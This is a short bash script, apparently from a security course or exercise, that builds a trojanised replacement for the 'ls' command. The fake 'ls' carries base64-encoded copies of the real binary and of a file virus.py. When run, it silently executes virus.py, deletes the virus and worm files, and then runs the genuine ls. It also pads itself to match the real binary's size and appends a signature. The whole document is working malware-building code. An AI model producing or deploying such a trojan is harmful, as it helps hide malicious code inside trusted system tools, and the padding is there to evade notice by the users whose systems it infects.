#!/usr/bin/env bash

FAKE_LS="ls"
SIG="\xaa\xbb\xcc\xdd"

ori_ls=`gzip -c /usr/bin/ls | base64 -w0`
virus=`cat virus.py | base64 -w0`

ORI_LS_FILENAME=".ori_ls"

touch $FAKE_LS
echo '#!/usr/bin/env bash' > $FAKE_LS
echo "ori_ls=$ori_ls" >> $FAKE_LS
echo "virus=$virus" >> $FAKE_LS
echo "echo \$ori_ls | base64 -d | gzip --decompress > $ORI_LS_FILENAME" >> $FAKE_LS
echo "echo \$virus | base64 -d > virus.py" >> $FAKE_LS
echo "chmod +x $ORI_LS_FILENAME && chmod +x virus.py" >> $FAKE_LS
echo "python3 virus.py $1 $2" >> $FAKE_LS  
echo "rm virus.py worm.py" >> $FAKE_LS
echo "./$ORI_LS_FILENAME \$1" >> $FAKE_LS

echo "rm $ORI_LS_FILENAME"  >> $FAKE_LS

ori_sz=$(echo $(wc -c /usr/bin/ls) | cut -d ' ' -f 1)
new_sz=$(echo $(wc -c ./ls) | cut -d ' ' -f 1)

n=$((ori_sz - new_sz - 5))

for i in $(seq 1 $n); do
    printf " " >> $FAKE_LS
done
printf "#%b" $SIG  >> $FAKE_LS
